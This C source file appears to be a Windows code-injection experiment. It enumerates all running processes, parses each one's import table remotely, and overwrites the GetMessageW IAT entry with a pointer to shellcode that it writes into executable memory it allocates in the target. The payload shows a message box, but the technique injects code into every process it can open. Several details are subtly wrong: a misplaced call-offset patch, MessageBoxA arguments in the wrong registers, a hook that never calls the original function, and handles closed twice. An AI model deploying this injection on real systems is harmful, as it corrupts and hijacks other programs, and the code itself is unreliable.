#include "header.h"
#include <tlhelp32.h>
#include <psapi.h>

DWORD* EnumActiveProcess(int* out_count) {
    HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snap == INVALID_HANDLE_VALUE) return NULL;

    PROCESSENTRY32W proc_entry = { 0 };
    proc_entry.dwSize = sizeof(proc_entry);

    DWORD* processes_ids = NULL;
    int process_count = 0;

    if (Process32FirstW(snap, &proc_entry)) {
        do {
            DWORD* temp = realloc(processes_ids, (process_count + 1) * sizeof(DWORD));
            if (!temp) {
                free(processes_ids);
                CloseHandle(snap);
                return NULL;
            }
            processes_ids = temp;
            processes_ids[process_count++] = proc_entry.th32ProcessID;
        } while (Process32NextW(snap, &proc_entry));
    }

    CloseHandle(snap);
    if (out_count) *out_count = process_count;
    return processes_ids;
}


HMODULE* GetModules(DWORD process_id, DWORD* count) {
    HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, process_id);
    if (!hProcess) return NULL;

    DWORD size = 0;
    EnumProcessModules(hProcess, NULL, 0, &size);
    if (size == 0) {
        CloseHandle(hProcess);
        return NULL;
    }

    HMODULE* hmods = (HMODULE*)malloc(size);
    if (!hmods) {
        CloseHandle(hProcess);
        return NULL;
    }

    EnumProcessModules(hProcess, hmods, size, &size);
    *count = size / sizeof(HMODULE);

    CloseHandle(hProcess);
    return hmods;
}

void HookGetMessage(HANDLE process, LPVOID IAT_addr) {
    if (!IAT_addr) return;

    printf("[*] Hooking GetMessageW IAT entry at: %p\n", IAT_addr);

    BYTE shellcode[] = {
        0x48, 0x83, 0xEC, 0x28,                         // sub rsp, 0x28
        0x48, 0x31, 0xC9,                               // xor rcx, rcx
        0x48, 0x8D, 0x15, 0, 0, 0, 0,                   // lea rdx, [rip+msg] (lpText)
        0x48, 0x8D, 0x0D, 0, 0, 0, 0,                   // lea rcx, [rip+cap] (lpCaption)
        0x6A, 0x00,                                     // push 0
        0xFF, 0x15, 0, 0, 0, 0,                         // call [rip+msgbox_ptr]
        0x48, 0x83, 0xC4, 0x28,                         // add rsp, 0x28
        0xC3                                            // ret
    };

    char msg[] = "GetMessageW hooked!";
    char cap[] = "IAT Hooked";
    FARPROC msgbox_addr = GetProcAddress(GetModuleHandleA("user32.dll"), "MessageBoxA");

    SIZE_T totalSize = sizeof(shellcode) + sizeof(msg) + sizeof(cap) + sizeof(void*);
    LPVOID remote_mem = VirtualAllocEx(process, NULL, totalSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!remote_mem) {
        printf("[-] VirtualAllocEx failed: %lu\n", GetLastError());
        return;
    }

    ULONGLONG base = (ULONGLONG)remote_mem;
    SIZE_T msg_off = sizeof(shellcode);
    SIZE_T cap_off = msg_off + sizeof(msg);
    SIZE_T msgbox_ptr_off = cap_off + sizeof(cap);

    *(DWORD*)(shellcode + 10) = (DWORD)((base + msg_off) - ((base + 14))); // rdx
    *(DWORD*)(shellcode + 17) = (DWORD)((base + cap_off) - ((base + 21))); // rcx
    *(DWORD*)(shellcode + 24) = (DWORD)((base + msgbox_ptr_off) - ((base + 28))); // call

    WriteProcessMemory(process, remote_mem, shellcode, sizeof(shellcode), NULL);
    WriteProcessMemory(process, (LPVOID)(base + msg_off), msg, sizeof(msg), NULL);
    WriteProcessMemory(process, (LPVOID)(base + cap_off), cap, sizeof(cap), NULL);
    WriteProcessMemory(process, (LPVOID)(base + msgbox_ptr_off), &msgbox_addr, sizeof(msgbox_addr), NULL);

    DWORD oldProtect;
    VirtualProtectEx(process, IAT_addr, sizeof(LPVOID), PAGE_READWRITE, &oldProtect);
    WriteProcessMemory(process, IAT_addr, &remote_mem, sizeof(LPVOID), NULL);
    VirtualProtectEx(process, IAT_addr, sizeof(LPVOID), oldProtect, &oldProtect);

    printf("[+] Hook installed.\n");
}


void PeParse(HMODULE BaseAddress, HANDLE hProcess) {
    //DOS_HEADER

    IMAGE_DOS_HEADER Dos_Header;
    SIZE_T bytesRead = 0;
    ReadProcessMemory(hProcess, BaseAddress, &Dos_Header, sizeof(IMAGE_DOS_HEADER), &bytesRead);

    if (Dos_Header.e_magic != IMAGE_DOS_SIGNATURE) {
        CloseHandle(hProcess);
        return;
    }

    //NT HEADER

    IMAGE_NT_HEADERS Nt_Header;
    LPVOID nt_header_addr = (LPVOID)((ULONG_PTR)BaseAddress + Dos_Header.e_lfanew);
    ReadProcessMemory(hProcess, nt_header_addr, &Nt_Header, sizeof(IMAGE_NT_HEADERS), &bytesRead);

    //ILT & IID

    IMAGE_IMPORT_DESCRIPTOR IID;
    LPVOID IID_ADDRESS = (LPVOID)((ULONG_PTR)BaseAddress + Nt_Header.OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress); //0X120



    while (1) {

        ReadProcessMemory(hProcess, IID_ADDRESS, &IID, sizeof(IMAGE_IMPORT_DESCRIPTOR), &bytesRead);
        if (IID.OriginalFirstThunk == 0 && IID.FirstThunk == 0) break;

        IMAGE_THUNK_DATA thunk, iatThunk;

        LPVOID thunk_Address = (LPVOID)((ULONG_PTR)BaseAddress + IID.OriginalFirstThunk);
        LPVOID iat_Address = (LPVOID)((ULONG_PTR)BaseAddress + IID.FirstThunk);

        while (1) {
            ReadProcessMemory(hProcess, thunk_Address, &thunk, sizeof(IMAGE_THUNK_DATA), &bytesRead);
            ReadProcessMemory(hProcess, iat_Address, &iatThunk, sizeof(IMAGE_THUNK_DATA), &bytesRead);

            if (thunk.u1.AddressOfData == 0) break;

            if (!(thunk.u1.Ordinal & IMAGE_ORDINAL_FLAG)) {
                char buffer[254];
                ReadProcessMemory(hProcess, (LPVOID)((ULONG_PTR)BaseAddress + thunk.u1.AddressOfData + 2), buffer, 254, &bytesRead);

                if (strcmp(buffer, "GetMessageW") == 0) {
                    HookGetMessage(hProcess, iat_Address);
                }
            }

            thunk_Address = (LPVOID)((ULONG_PTR)thunk_Address + sizeof(IMAGE_THUNK_DATA));
            iat_Address = (LPVOID)((ULONG_PTR)iat_Address + sizeof(IMAGE_THUNK_DATA));
        }

        IID_ADDRESS = (LPVOID)((ULONG_PTR)IID_ADDRESS + sizeof(IMAGE_IMPORT_DESCRIPTOR));

    }
}

void main__() {
    int process_count;
    DWORD* process_ids = EnumActiveProcess(&process_count);

    for (int i = 0; i < process_count; i++) {

        DWORD count;
        HMODULE* hmods = GetModules(process_ids[i], &count);
        HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, process_ids[i]);

        if (!hmods) continue;
        if (hProcess == INVALID_HANDLE_VALUE || hProcess == NULL) {
            free(hmods);
            printf("couldnt get process handle\n");
            continue;
        }

        PeParse(hmods[0], hProcess);

        CloseHandle(hProcess);
        free(hmods);
    }

    free(process_ids);
}